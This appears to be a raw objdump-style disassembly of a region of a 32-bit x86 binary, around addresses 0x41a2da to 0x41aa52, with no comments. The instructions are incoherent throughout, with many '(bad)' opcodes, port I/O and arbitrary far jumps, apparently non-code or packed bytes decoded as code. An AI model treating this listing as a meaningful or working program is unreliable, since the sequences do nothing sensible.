  41a2da:	ss pop eax
  41a2dc:	jmp    FWORD PTR [esi]
  41a2de:	jno    0x41a2a1
  41a2e0:	in     eax,dx
  41a2e1:	lahf   
  41a2e2:	into   
  41a2e3:	pop    eax
  41a2e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2e5:	lea    edi,[eax+0x3af2ebaa]
  41a2eb:	ins    BYTE PTR es:[edi],dx
  41a2ec:	or     al,0x65
  41a2ee:	into   
  41a2ef:	cmp    esi,DWORD PTR [ebp+0x29a3f61f]
  41a2f5:	ror    cl,cl
  41a2f7:	sahf   
  41a2f8:	out    dx,al
  41a2f9:	repz imul esi,DWORD PTR [ecx],0x9d9bbace
  41a300:	lahf   
  41a301:	xchg   esp,eax
  41a302:	adc    bh,BYTE PTR [eax-0x3527e518]
  41a308:	gs sub dh,al
  41a30b:	mov    dh,BYTE PTR [esi+edi*1+0x1e]
  41a30f:	stos   DWORD PTR es:[edi],eax
  41a310:	sbb    al,0x92
  41a312:	aam    0xc
  41a314:	sub    esi,DWORD PTR [esi-0x1548eb7b]
  41a31a:	jmp    0x77d299b2
  41a31f:	add    eax,0xbf60fc88
  41a324:	fmul   st(4),st
  41a326:	mov    al,ds:0x23e706a4
  41a32b:	dec    ebp
  41a32c:	mov    ds:0x2f43db60,al
  41a331:	in     eax,0x83
  41a333:	aaa    
  41a334:	xor    bl,BYTE PTR [eax-0x6cc62dc7]
  41a33a:	pop    esp
  41a33b:	jno    0x41a377
  41a33d:	pusha  
  41a33e:	test   al,0x5f
  41a340:	jmp    0x51e7:0xddbecb66
  41a347:	call   0xfa12c856
  41a34c:	loop   0x41a34a
  41a34e:	lods   eax,DWORD PTR ds:[esi]
  41a34f:	not    DWORD PTR [ebx]
  41a351:	sub    dh,BYTE PTR [esi-0x36]
  41a354:	or     DWORD PTR [eax],esi
  41a356:	aam    0xe5
  41a358:	lods   al,BYTE PTR ds:[esi]
  41a359:	cmovne edi,ecx
  41a35c:	bsf    esi,ebx
  41a35f:	add    BYTE PTR [edi],cl
  41a361:	jmp    0x5ca1:0xf99926ee
  41a368:	sahf   
  41a369:	pop    ecx
  41a36a:	lods   al,BYTE PTR ds:[esi]
  41a36b:	fiadd  DWORD PTR [esi+0x7]
  41a36e:	dec    ecx
  41a36f:	mov    ch,0xb8
  41a371:	xchg   edx,eax
  41a372:	sub    DWORD PTR [edx+0x1134ad27],edx
  41a378:	mov    ah,0x9
  41a37a:	push   0x18
  41a37c:	pop    ss
  41a37d:	mov    esp,0x94cdfec0
  41a382:	mov    dh,0x4e
  41a384:	out    dx,eax
  41a385:	cmp    al,0x2b
  41a387:	(bad)  
  41a388:	pop    edx
  41a389:	sub    al,BYTE PTR [eax-0x1387a06a]
  41a38f:	fwait
  41a390:	stos   BYTE PTR es:[edi],al
  41a391:	pop    esp
  41a392:	push   esi
  41a393:	sbb    bh,BYTE PTR [ebp-0x3d]
  41a396:	or     ch,dl
  41a398:	inc    ecx
  41a399:	(bad)  
  41a39a:	fld    QWORD PTR [esi-0x10]
  41a39d:	and    al,0x5c
  41a39f:	or     BYTE PTR [esi-0x3502703],cl
  41a3a5:	jmp    0x1426:0xad87fc11
  41a3ac:	and    ah,dh
  41a3ae:	ins    BYTE PTR es:[edi],dx
  41a3af:	leave  
  41a3b0:	mov    bl,BYTE PTR [ebp-0x6ba7dd65]
  41a3b6:	sbb    edx,esi
  41a3b8:	add    cl,BYTE PTR [ecx+ebp*1+0x9]
  41a3bc:	mov    WORD PTR [edi-0x1],fs
  41a3bf:	adc    al,0x54
  41a3c1:	mov    ebp,0xd357a81b
  41a3c6:	push   0xffffff96
  41a3c8:	add    ecx,ebx
  41a3ca:	pop    ds
  41a3cb:	cmc    
  41a3cc:	or     al,0x6c
  41a3ce:	sti    
  41a3cf:	jne    0x41a421
  41a3d1:	psrad  mm1,QWORD PTR [edi]
  41a3d4:	jbe    0x41a3a6
  41a3d6:	sbb    al,0x5b
  41a3d8:	enter  0x4945,0x91
  41a3dc:	pop    edi
  41a3dd:	or     dh,bl
  41a3df:	fucom  st(2)
  41a3e1:	mov    edx,0x5dc04e14
  41a3e6:	rol    DWORD PTR [ebp+eiz*4-0x280a017e],1
  41a3ed:	aaa    
  41a3ee:	jmp    0x41a440
  41a3f0:	sti    
  41a3f1:	aaa    
  41a3f2:	in     al,dx
  41a3f3:	add    ecx,DWORD PTR [ebx]
  41a3f5:	push   cs
  41a3f6:	push   ebx
  41a3f7:	mov    WORD PTR [edx-0xe16759f],?
  41a3fd:	mov    al,0xb7
  41a3ff:	inc    esp
  41a400:	lahf   
  41a401:	dec    eax
  41a403:	sbb    ecx,DWORD PTR [eax+0x3c18a4d0]
  41a409:	jmp    0x41a464
  41a40b:	call   0x4e96:0x57ca9cb7
  41a412:	xor    ebx,DWORD PTR [esi-0x11]
  41a415:	daa    
  41a416:	inc    esp
  41a417:	loop   0x41a3df
  41a419:	ficom  DWORD PTR [ebp-0x49]
  41a41c:	inc    esp
  41a41d:	jecxz  0x41a3bb
  41a41f:	rcl    edi,0xe5
  41a422:	xchg   edx,ebx
  41a424:	pop    edx
  41a425:	fimul  WORD PTR [eax-0x61]
  41a428:	bound  edx,QWORD PTR [ebx+0x50]
  41a42b:	mov    eax,0xd1c4afb9
  41a430:	jmp    0xa78ffca5
  41a435:	inc    esp
  41a436:	pop    edi
  41a437:	mov    al,ds:0xd10f8f16
  41a43c:	pop    esi
  41a43d:	mov    esi,0x9d73b6df
  41a442:	and    DWORD PTR [edi-0x21bccc26],eax
  41a448:	push   edi
  41a449:	pop    esp
  41a44a:	inc    ebp
  41a44b:	out    0xa9,eax
  41a44d:	mov    edi,0x81ca3bed
  41a452:	cwde   
  41a453:	dec    ebp
  41a454:	jae    0x41a3f7
  41a456:	cmp    DWORD PTR [ebp-0x2fe1b65c],esi
  41a45c:	bound  esp,QWORD PTR [eax+0x31c27045]
  41a462:	dec    ecx
  41a463:	xor    eax,0xa59008a4
  41a468:	sbb    ah,0x6
  41a46b:	fucom  st(5)
  41a46d:	pushf  
  41a46e:	das    
  41a46f:	out    0xc5,eax
  41a471:	push   esp
  41a472:	mov    dh,0x28
  41a474:	mov    esi,cs
  41a476:	and    BYTE PTR [edx],0xf4
  41a479:	gs xor al,0x7a
  41a47c:	enter  0x78e6,0x16
  41a480:	mov    cl,0xb1
  41a482:	dec    bx
  41a484:	inc    ebp
  41a485:	mov    WORD PTR [edi-0x3e4f06b3],es
  41a48b:	and    BYTE PTR [edx-0x2ce6087e],0x70
  41a492:	jne    0x41a506
  41a494:	fwait
  41a495:	retf   0x3937
  41a498:	mov    ds:0x5c7fbcc5,al
  41a49d:	inc    edx
  41a49e:	out    0x6c,al
  41a4a0:	ja     0x41a45f
  41a4a2:	ins    BYTE PTR es:[edi],dx
  41a4a3:	cmc    
  41a4a4:	ins    BYTE PTR es:[edi],dx
  41a4a5:	shl    DWORD PTR [eax+0x38],cl
  41a4a8:	test   BYTE PTR [ebx+0x447ba610],bl
  41a4ae:	mov    ds,WORD PTR [esi+0x6f8b858a]
  41a4b4:	add    DWORD PTR [ecx+0x3508e819],esi
  41a4ba:	adc    BYTE PTR [esp+eax*4],0xdb
  41a4be:	xor    eax,0x40fa6931
  41a4c3:	ins    BYTE PTR es:[edi],dx
  41a4c4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41a4c6:	rcr    ebx,1
  41a4c8:	out    0xd0,eax
  41a4ca:	ja     0x41a48b
  41a4cc:	test   al,0xb4
  41a4ce:	push   cs
  41a4cf:	mov    ds:0x2e6f51ac,al
  41a4d4:	mov    ebx,0x2c5aeb17
  41a4d9:	inc    esi
  41a4da:	xor    ebx,ebp
  41a4dc:	dec    eax
  41a4dd:	jns    0x41a4b7
  41a4df:	dec    ecx
  41a4e0:	add    ebx,DWORD PTR [esi]
  41a4e2:	retf   0x2f2b
  41a4e5:	into   
  41a4e6:	std    
  41a4e7:	iret   
  41a4e8:	jmp    0x41a47b
  41a4ea:	retf   0xbfe0
  41a4ed:	cwde   
  41a4ee:	xor    ebp,DWORD PTR [edi-0x46]
  41a4f1:	fadd   DWORD PTR [edi-0x5b]
  41a4f4:	adc    DWORD PTR [ebp-0x3e],0x11
  41a4f8:	repz jo 0x41a4c0
  41a4fb:	ss int 0xc9
  41a4fe:	and    dl,BYTE PTR [eax+0x3d]
  41a501:	js     0x41a557
  41a503:	jne    0x41a532
  41a505:	scas   eax,DWORD PTR es:[edi]
  41a506:	aad    0xf
  41a508:	ins    DWORD PTR es:[edi],dx
  41a509:	cmp    DWORD PTR ds:0xec96e718,edi
  41a50f:	jmp    0x41a4ef
  41a511:	or     DWORD PTR [eax+eiz*4],esi
  41a514:	xor    bh,BYTE PTR [eax]
  41a516:	xor    dl,0x83
  41a519:	ret    
  41a51a:	xlat   BYTE PTR ds:[ebx]
  41a51b:	fs (bad) 
  41a51e:	mov    DWORD PTR [ebx+0x21],edx
  41a521:	pop    ds
  41a522:	pop    ds
  41a523:	sub    bl,BYTE PTR [ebx+0x35fe6168]
  41a529:	adc    ebp,esp
  41a52b:	(bad)  
  41a52c:	ffreep st(0)
  41a52e:	mov    cl,0x6d
  41a530:	jnp    0x41a529
  41a532:	or     edx,DWORD PTR ds:0x5a0bf4c3
  41a538:	in     al,0xf4
  41a53a:	or     dh,BYTE PTR [ebx+0x5bb1e4e8]
  41a540:	mov    eax,ebp
  41a542:	int3   
  41a543:	adc    edi,DWORD PTR [edi]
  41a545:	mov    esp,0x717d64f0
  41a54a:	mov    esi,0xe9dde331
  41a54f:	jge    0x41a55a
  41a551:	sub    DWORD PTR [ecx],edi
  41a553:	pop    ebp
  41a554:	pop    ss
  41a555:	(bad)  
  41a556:	cdq    
  41a557:	sti    
  41a558:	loopne 0x41a4e9
  41a55a:	and    al,0x30
  41a55c:	pop    esi
  41a55d:	call   DWORD PTR [edi]
  41a55f:	jge    0x41a585
  41a561:	inc    ebx
  41a562:	or     DWORD PTR [ebx+0x11],0xffffffa4
  41a566:	push   es
  41a567:	cdq    
  41a568:	fnsave ds:0x64a04b79
  41a56e:	mov    gs,WORD PTR [ebp+edi*2+0x8]
  41a572:	mov    al,0x7
  41a574:	dec    ebx
  41a575:	xchg   edx,eax
  41a576:	cwde   
  41a577:	cmp    dl,dh
  41a579:	in     eax,0xba
  41a57b:	dec    ebx
  41a57c:	loop   0x41a55d
  41a57e:	or     DWORD PTR [esi],ebp
  41a580:	sahf   
  41a581:	retf   0x1310
  41a584:	pop    ds
  41a585:	pop    edi
  41a586:	xor    BYTE PTR [ebp+0x54a2ccbc],dl
  41a58c:	addr16 jmp 0xaf37:0xd55fb145
  41a594:	mov    BYTE PTR [edi-0x3c],0x6
  41a598:	dec    edi
  41a599:	rcl    BYTE PTR [edx+0x70],cl
  41a59c:	mov    ebp,edx
  41a59e:	pop    esp
  41a59f:	sar    DWORD PTR [edx-0x26f1db13],cl
  41a5a5:	(bad)  
  41a5a6:	mov    esi,fs
  41a5a8:	iret   
  41a5a9:	pop    ds
  41a5aa:	pushf  
  41a5ab:	pop    esp
  41a5ac:	outs   dx,BYTE PTR ds:[esi]
  41a5ad:	mov    al,ds:0x216a11f0
  41a5b2:	sahf   
  41a5b3:	dec    esp
  41a5b4:	jge    0x41a624
  41a5b6:	or     DWORD PTR [edx+eiz*8],esi
  41a5b9:	pop    eax
  41a5ba:	outs   dx,DWORD PTR ds:[esi]
  41a5bb:	xlat   BYTE PTR ds:[ebx]
  41a5bc:	xchg   esp,eax
  41a5bd:	inc    esp
  41a5be:	fistp  QWORD PTR [eax+0x21]
  41a5c1:	mov    ecx,0x5ceebcf4
  41a5c6:	and    al,BYTE PTR [esp+ebp*2+0x68a973a8]
  41a5cd:	add    BYTE PTR [eax+0x53],dh
  41a5d0:	repnz (bad) 
  41a5d2:	mov    bh,0x65
  41a5d4:	cli    
  41a5d5:	lea    esi,[ebp+ebx*2-0x65]
  41a5d9:	fist   DWORD PTR [edi]
  41a5db:	jmp    0x41a647
  41a5dd:	push   ss
  41a5de:	(bad)  
  41a5df:	cmp    eax,0xdbcf6330
  41a5e4:	icebp  
  41a5e5:	cmp    eax,0x4ee2fcda
  41a5ea:	out    0x57,eax
  41a5ec:	cs jnp 0x41a62d
  41a5ef:	stos   BYTE PTR es:[edi],al
  41a5f0:	pushf  
  41a5f1:	and    DWORD PTR [edx],eax
  41a5f3:	cmp    dl,BYTE PTR [ecx+eiz*4]
  41a5f6:	xchg   edi,eax
  41a5f7:	xchg   ecx,eax
  41a5f8:	dec    ebx
  41a5f9:	xchg   ebp,eax
  41a5fa:	sbb    ebx,DWORD PTR [esp+ecx*2]
  41a5fd:	dec    ecx
  41a5fe:	addr16 mov ch,0x70
  41a601:	out    0x7,al
  41a603:	fs dec edx
  41a605:	adc    DWORD PTR [edi],edx
  41a607:	add    ecx,DWORD PTR [ebx-0x6a34945]
  41a60d:	and    ecx,ecx
  41a60f:	dec    ecx
  41a610:	or     esi,DWORD PTR [edx-0x7f806291]
  41a616:	lahf   
  41a617:	push   esi
  41a618:	sub    edi,ebx
  41a61a:	dec    esi
  41a61b:	(bad)
  41a61e:	shl    edx,0xb0
  41a621:	out    dx,eax
  41a622:	mov    cl,0x79
  41a624:	es lock loope 0x41a688
  41a628:	inc    ebx
  41a629:	gs js  0x41a65e
  41a62c:	ja     0x41a606
  41a62e:	cmp    al,0x54
  41a630:	fcmove st,st(4)
  41a632:	or     al,0x7b
  41a634:	mov    bh,0x0
  41a636:	mov    edx,0x1ba6d6bf
  41a63b:	and    BYTE PTR [edx-0x42],cl
  41a63e:	inc    DWORD PTR [esi+0x2354c060]
  41a644:	fstp   QWORD PTR [ecx-0x64a42a3]
  41a64a:	addr16 dec bx
  41a64d:	push   edx
  41a64e:	(bad)  
  41a64f:	rcr    ebx,cl
  41a651:	aas    
  41a652:	jae    0x41a652
  41a654:	cmp    BYTE PTR [esi],cl
  41a656:	or     eax,0x2b1320c1
  41a65b:	mov    ebx,?
  41a65d:	jg     0x41a688
  41a65f:	enter  0x9f47,0x2c
  41a663:	out    dx,al
  41a664:	lds    edx,FWORD PTR [ebx-0x227c1a68]
  41a66a:	in     al,0x15
  41a66c:	adc    esi,DWORD PTR [esi+ebx*2+0x25b07acb]
  41a673:	and    esi,DWORD PTR gs:[ebx+0x1d261d7b]
  41a67a:	mov    cl,0x9c
  41a67c:	mov    edi,DWORD PTR [ecx-0x60cccd2d]
  41a682:	call   0xd3f76405
  41a687:	and    DWORD PTR [ebx+ecx*1],ecx
  41a68a:	or     eax,0x4f118ee2
  41a68f:	xor    al,0x7a
  41a691:	inc    eax
  41a692:	or     al,0x20
  41a694:	and    al,0x6e
  41a696:	pop    edi
  41a697:	or     BYTE PTR [edi+0x5b007074],0x7a
  41a69e:	mov    fs,WORD PTR [ecx-0x5b5e5b6d]
  41a6a4:	push   eax
  41a6a5:	pop    edi
  41a6a6:	or     ch,BYTE PTR [esi-0x667c2323]
  41a6ac:	rol    DWORD PTR es:[ebx],0x7b
  41a6b0:	mov    ecx,0x42712865
  41a6b5:	mov    ebx,0xe510f203
  41a6ba:	push   es
  41a6bb:	cmp    DWORD PTR [edx-0x1fa897b7],edx
  41a6c1:	pop    ebp
  41a6c2:	cmp    bh,bl
  41a6c4:	test   al,0xb5
  41a6c6:	cld    
  41a6c7:	lds    edi,FWORD PTR [ebx+0x77]
  41a6ca:	fdivr  QWORD PTR [ebx]
  41a6cc:	xchg   ecx,eax
  41a6cd:	dec    ebx
  41a6ce:	cmp    al,BYTE PTR [ecx+ebp*2+0x7538bc5f]
  41a6d5:	(bad)  
  41a6d6:	out    dx,al
  41a6d7:	sbb    al,0x2c
  41a6d9:	popf   
  41a6da:	add    DWORD PTR [ebp+0x7a8affdd],edx
  41a6e0:	sub    al,0x84
  41a6e2:	cmp    eax,0xf66e7654
  41a6e7:	in     eax,0x34
  41a6e9:	inc    edx
  41a6ea:	add    eax,DWORD PTR [ecx]
  41a6ec:	loope  0x41a6d1
  41a6ee:	(bad)  
  41a6ef:	(bad)  
  41a6f1:	dec    ebx
  41a6f2:	sar    DWORD PTR [esi+eax*8],cl
  41a6f5:	jo     0x41a6ce
  41a6f7:	inc    BYTE PTR [edx+0xd]
  41a6fa:	dec    ebp
  41a6fb:	sub    BYTE PTR ds:0xff0771d4,ah
  41a701:	das    
  41a702:	push   edx
  41a703:	cdq    
  41a704:	pop    edx
  41a705:	sbb    DWORD PTR [esp+edi*8],esp
  41a708:	jecxz  0x41a68a
  41a70a:	push   edi
  41a70b:	or     dh,ah
  41a70d:	xchg   esi,eax
  41a70e:	(bad)  
  41a70f:	and    BYTE PTR [edi+0x6d5f13a0],dl
  41a715:	fld    DWORD PTR [edi+0x547ed570]
  41a71b:	mov    eax,ds:0xe92353f8
  41a720:	retf   0x3cbe
  41a723:	jmp    0x41a75e
  41a725:	xchg   esi,eax
  41a726:	mov    ebx,DWORD PTR [edi-0xa]
  41a729:	aad    0x84
  41a72b:	dec    edi
  41a72c:	vandps xmm3,xmm6,xmm5
  41a730:	pop    edi
  41a731:	mov    ah,0xd9
  41a733:	mov    BYTE PTR [edx+esi*8],cl
  41a736:	ret    
  41a737:	in     al,dx
  41a738:	cmp    al,0xdb
  41a73a:	cmc    
  41a73b:	aas    
  41a73c:	sbb    esi,ebp
  41a73e:	add    cl,BYTE PTR [eax]
  41a740:	adc    cl,BYTE PTR [ebp+0x6748fe38]
  41a746:	outs   dx,BYTE PTR ds:[esi]
  41a747:	xor    eax,0x6493b8e8
  41a74c:	cmp    BYTE PTR [esi+0x66],bh
  41a74f:	adc    BYTE PTR [ebp+0x650b2605],dl
  41a755:	sub    edi,DWORD PTR [ecx+0x18b16a65]
  41a75b:	pop    edx
  41a75c:	push   ds
  41a75d:	mov    dh,0x57
  41a75f:	sbb    ah,BYTE PTR [edx-0x5c3045aa]
  41a765:	fcomp  DWORD PTR [esi-0x3f]
  41a768:	and    eax,DWORD PTR fs:[eax]
  41a76b:	daa    
  41a76c:	xor    BYTE PTR [eax+0x68],al
  41a76f:	cmp    bh,ch
  41a771:	xor    DWORD PTR [ebx+0x40ee2281],edi
  41a777:	iret   
  41a778:	jl     0x41a79f
  41a77a:	mov    WORD PTR ds:0x82617bfc,?
  41a780:	push   cs
  41a781:	adc    cl,ah
  41a783:	and    DWORD PTR [ebx+0x2ecc8700],0x2b38f569
  41a78d:	adc    dh,BYTE PTR [ecx-0x71ae0409]
  41a793:	jno    0x41a793
  41a795:	daa    
  41a796:	daa    
  41a797:	js     0x41a80b
  41a799:	adc    ebp,DWORD PTR [esi-0x34b5bb0d]
  41a79f:	mov    ebx,0x5e4cce19
  41a7a4:	clc    
  41a7a5:	xchg   edi,eax
  41a7a6:	les    edx,FWORD PTR [esi]
  41a7a8:	or     eax,0xddc21745
  41a7ad:	adc    eax,0x22c24b30
  41a7b2:	inc    eax
  41a7b3:	fucom  st(2)
  41a7b5:	repnz xchg esp,eax
  41a7b7:	cld    
  41a7b8:	cmp    eax,0x10298f9f
  41a7bd:	rcr    ah,1
  41a7bf:	bound  ebp,QWORD PTR [esi+edi*1+0x1b]
  41a7c3:	mov    edx,0x376f72ed
  41a7c8:	in     al,0xc
  41a7ca:	clc    
  41a7cb:	xchg   esi,eax
  41a7cc:	cdq    
  41a7cd:	test   BYTE PTR [eax+edi*1+0x65624016],0x53
  41a7d5:	pop    ebx
  41a7d6:	add    al,0xcf
  41a7d8:	push   ebp
  41a7d9:	rcr    DWORD PTR [edx+0x745d4dfe],0x62
  41a7e0:	jge    0x41a851
  41a7e2:	mov    dl,0x8a
  41a7e4:	mov    al,0x2
  41a7e6:	mov    eax,0x374c3441
  41a7eb:	mov    esi,0x66a36bef
  41a7f0:	pusha  
  41a7f1:	add    bh,BYTE PTR [esi-0x66]
  41a7f4:	lods   al,BYTE PTR ds:[esi]
  41a7f5:	mov    ebp,0x4311ef68
  41a7fa:	loop   0x41a87b
  41a7fc:	in     eax,0x1d
  41a7fe:	inc    eax
  41a7ff:	loopne 0x41a7a5
  41a801:	dec    eax
  41a802:	sar    DWORD PTR [edx+edx*4+0x31e36e7f],0x91
  41a80a:	js     0x41a879
  41a80c:	test   DWORD PTR [edx+0x6f251ee8],esp
  41a812:	ins    DWORD PTR es:[edi],dx
  41a813:	jecxz  0x41a821
  41a815:	cmp    DWORD PTR [bp-0x6ff9],ecx
  41a81a:	stos   DWORD PTR es:[edi],eax
  41a81b:	js     0x41a86d
  41a81d:	repz rcr BYTE PTR [esi-0x31d495d7],1
  41a824:	lds    esi,FWORD PTR [edx+0x4aa6b500]
  41a82a:	cld    
  41a82b:	inc    esp
  41a82c:	pop    ss
  41a82d:	pop    ebx
  41a82e:	mov    ecx,0x6b1eabe4
  41a833:	sub    DWORD PTR [edi-0x4ee5f78e],edi
  41a839:	mov    edx,DWORD PTR [esi]
  41a83b:	and    BYTE PTR [edi+esi*1+0x518ea2d1],bl
  41a842:	inc    ebp
  41a843:	pop    edx
  41a844:	jle    0x41a7f8
  41a846:	adc    ecx,0x80aff5da
  41a84c:	inc    edi
  41a84d:	push   ds
  41a84e:	popa   
  41a84f:	into   
  41a850:	xchg   esp,eax
  41a851:	repnz cdq 
  41a853:	popa   
  41a854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a855:	cmp    esi,DWORD PTR [edx+0x1410936b]
  41a85b:	adc    DWORD PTR [ebx+0x7a],eax
  41a85e:	mov    dl,0x9
  41a860:	xchg   esi,eax
  41a861:	not    BYTE PTR ds:[ebp+esi*2-0x527c85d5]
  41a869:	(bad)  
  41a86a:	push   eax
  41a86b:	or     DWORD PTR [esi-0x599ae44b],eax
  41a871:	jae    0x41a857
  41a873:	xchg   edi,eax
  41a874:	or     DWORD PTR [edx+ebx*8],0xc7791658
  41a87b:	or     cl,BYTE PTR [edx]
  41a87d:	jno    0x41a8fa
  41a87f:	addr16 (bad) 
  41a881:	inc    esp
  41a882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a883:	inc    eax
  41a884:	in     al,dx
  41a885:	outs   dx,DWORD PTR ds:[esi]
  41a886:	push   ss
  41a887:	test   BYTE PTR [eax+0x4f],cl
  41a88a:	hlt    
  41a88b:	sub    esi,esi
  41a88d:	pop    eax
  41a88e:	aaa    
  41a88f:	sbb    ebx,DWORD PTR [ebp+0x3ef929fe]
  41a895:	adc    BYTE PTR [ebx],ah
  41a897:	fistp  DWORD PTR [ebx+0x1c]
  41a89a:	(bad)  
  41a89b:	in     al,dx
  41a89c:	aas    
  41a89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a89e:	mov    WORD PTR [ebp+0x7839faef],fs
  41a8a4:	jno    0x41a8d1
  41a8a6:	xchg   edx,eax
  41a8a7:	(bad)  
  41a8a8:	out    dx,eax
  41a8a9:	and    esi,DWORD PTR [edi-0x62e828c2]
  41a8af:	dec    ebp
  41a8b0:	inc    edi
  41a8b1:	mov    ecx,0x116cdec1
  41a8b6:	or     ah,al
  41a8b8:	inc    ebp
  41a8b9:	add    dl,BYTE PTR [eax+eiz*1+0x74ee67b1]
  41a8c0:	sbb    al,0x20
  41a8c2:	cs xchg esi,eax
  41a8c4:	and    bh,cl
  41a8c6:	cld    
  41a8c7:	push   0xe0172a66
  41a8cc:	xchg   esi,eax
  41a8cd:	xor    DWORD PTR [ebp-0x1a4cfe34],esp
  41a8d3:	sbb    BYTE PTR [ecx+0x3b],dh
  41a8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8d7:	pop    esp
  41a8d8:	inc    ecx
  41a8d9:	pop    ebp
  41a8da:	fwait
  41a8db:	aam    0xa9
  41a8dd:	outs   dx,BYTE PTR ds:[esi]
  41a8de:	ins    DWORD PTR es:[edi],dx
  41a8df:	pop    ss
  41a8e0:	xor    bh,BYTE PTR [esi-0x4]
  41a8e3:	(bad)  
  41a8e5:	fwait
  41a8e6:	sub    edx,DWORD PTR [esi]
  41a8e8:	pop    esi
  41a8e9:	xor    ebx,edi
  41a8eb:	mov    edx,0xb1ff5651
  41a8f0:	neg    DWORD PTR [edx+0x58]
  41a8f3:	loopne 0x41a889
  41a8f5:	sub    BYTE PTR [esi+0x78],0xda
  41a8f9:	or     al,0x6f
  41a8fb:	(bad)  [edi+0x491f126f]
  41a901:	jp     0x41a93b
  41a903:	stos   DWORD PTR es:[edi],eax
  41a904:	stos   DWORD PTR es:[edi],eax
  41a905:	xor    eax,0x3813eb3f
  41a90a:	xchg   edx,eax
  41a90b:	pushf  
  41a90c:	sbb    DWORD PTR [edi],ebx
  41a90e:	inc    eax
  41a90f:	cmp    bl,bl
  41a911:	fsubr  st,st(3)
  41a913:	out    dx,al
  41a914:	sub    dh,BYTE PTR [ebx-0x5e]
  41a917:	xlat   BYTE PTR ds:[ebx]
  41a918:	jns    0x41a8b0
  41a91a:	neg    ebp
  41a91c:	fwait
  41a91d:	cmp    ch,BYTE PTR [edi]
  41a91f:	push   ds
  41a920:	mov    ebp,fs
  41a922:	xchg   BYTE PTR [ebx],bl
  41a924:	adc    BYTE PTR [ecx-0x4c],dh
  41a927:	ds adc ebx,0xd4171e1
  41a92e:	out    dx,eax
  41a92f:	lods   eax,DWORD PTR ds:[esi]
  41a930:	mov    ds:0xf8fb0afb,eax
  41a935:	bnd js 0x41a8e2
  41a938:	in     eax,dx
  41a939:	mov    WORD PTR [eax-0x74],?
  41a93c:	xor    edx,DWORD PTR [ebx-0x7868c2a8]
  41a942:	repnz mov esi,0xbb9b48c4
  41a948:	mov    edx,0xf20e332b
  41a94d:	jae    0x41a929
  41a94f:	mov    ds:0xc5a88091,eax
  41a954:	mov    WORD PTR [esi],gs
  41a956:	jns    0x41a94e
  41a958:	sub    ebx,ebp
  41a95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a95b:	push   ds
  41a95c:	inc    ecx
  41a95d:	sbb    DWORD PTR [esi],0xb53c25f
  41a963:	push   edx
  41a964:	sahf   
  41a965:	jnp    0x41a960
  41a967:	pop    eax
  41a968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a969:	xchg   ecx,eax
  41a96a:	dec    ecx
  41a96b:	adc    DWORD PTR [eax],0x70
  41a96e:	add    ebx,edi
  41a970:	outs   dx,BYTE PTR ds:[esi]
  41a971:	pop    esi
  41a972:	bound  eax,QWORD PTR [ecx]
  41a974:	cmc    
  41a975:	int    0x79
  41a977:	iret   
  41a978:	inc    esi
  41a979:	pop    esi
  41a97a:	cmp    DWORD PTR [esi+0x2e],edi
  41a97d:	test   BYTE PTR [di],ch
  41a980:	cdq    
  41a981:	sub    bl,bl
  41a983:	pop    es
  41a984:	inc    ecx
  41a985:	push   ebp
  41a986:	aas    
  41a987:	fiadd  DWORD PTR [esi-0x7c]
  41a98a:	dec    esi
  41a98b:	rcl    dl,cl
  41a98d:	shl    DWORD PTR [ebp-0x1c21d7c2],0xe2
  41a994:	xor    esp,DWORD PTR ds:0x5e900c54
  41a99a:	push   0xa527e191
  41a99f:	call   0x76694f7c
  41a9a4:	pop    eax
  41a9a5:	jp     0x41a984
  41a9a7:	sar    BYTE PTR [ebx*8+0x28d65013],0xc
  41a9af:	imul   edi,DWORD PTR [edx],0xffffffc4
  41a9b2:	add    al,0x58
  41a9b4:	dec    al
  41a9b6:	pop    ss
  41a9b7:	pushf  
  41a9b8:	fs jno 0x41aa3a
  41a9bb:	not    DWORD PTR [esi]
  41a9bd:	lea    esp,[ecx-0x2b5fc261]
  41a9c3:	sbb    DWORD PTR [esi+0x0],ebp
  41a9c6:	enter  0xed79,0xf2
  41a9ca:	ror    DWORD PTR ss:[edx-0x12],1
  41a9ce:	and    BYTE PTR [esp+esi*8],0xca
  41a9d2:	out    0xa0,al
  41a9d4:	rol    DWORD PTR [edi],cl
  41a9d6:	test   esi,ebx
  41a9d8:	inc    esi
  41a9d9:	out    dx,eax
  41a9da:	xchg   edx,eax
  41a9db:	adc    ebx,DWORD PTR [edi+0x63b2cc84]
  41a9e1:	test   BYTE PTR [ecx-0x61],ch
  41a9e4:	or     eax,0x9b07b405
  41a9e9:	jne    0x41a97e
  41a9eb:	xchg   ebp,eax
  41a9ec:	(bad)  
  41a9ed:	jo     0x41a9d8
  41a9ef:	into   
  41a9f0:	mov    esp,edx
  41a9f2:	int3   
  41a9f3:	pop    ss
  41a9f4:	xchg   ah,al
  41a9f6:	jb     0x41aa58
  41a9f8:	stc    
  41a9f9:	data16 cld 
  41a9fb:	ror    DWORD PTR [edi+0x2da28f87],0x41
  41aa02:	or     dh,al
  41aa04:	dec    ebx
  41aa05:	aam    0x93
  41aa07:	ret    0xe9b7
  41aa0a:	pop    ss
  41aa0b:	test   DWORD PTR [edx-0x22],esp
  41aa0e:	adc    eax,esi
  41aa10:	add    eax,0x2adf7990
  41aa15:	in     al,dx
  41aa16:	xor    DWORD PTR [esp+eax*4-0x41],ebp
  41aa1a:	test   BYTE PTR [ebp*1-0x5fd970da],dl
  41aa21:	jmp    0x77a2:0x5fabb325
  41aa28:	dec    esp
  41aa29:	jle    0x41aa40
  41aa2b:	push   edi
  41aa2c:	dec    edi
  41aa2d:	mov    ds:0x4ec29376,eax
  41aa32:	jge    0x41aa14
  41aa34:	aam    0xdd
  41aa36:	push   0x8f4368cd
  41aa3b:	xchg   edi,eax
  41aa3c:	jge    0x41a9c4
  41aa3e:	xor    eax,0x6f7451d1
  41aa43:	inc    esi
  41aa44:	jge    0x41aa34
  41aa46:	pop    ebp
  41aa47:	or     ecx,ecx
  41aa49:	aaa    
  41aa4a:	les    esp,FWORD PTR [ebp+0x5db13281]
  41aa50:	xchg   edx,eax
  41aa51:	stos   BYTE PTR es:[edi],al
  41aa52:	push   eax
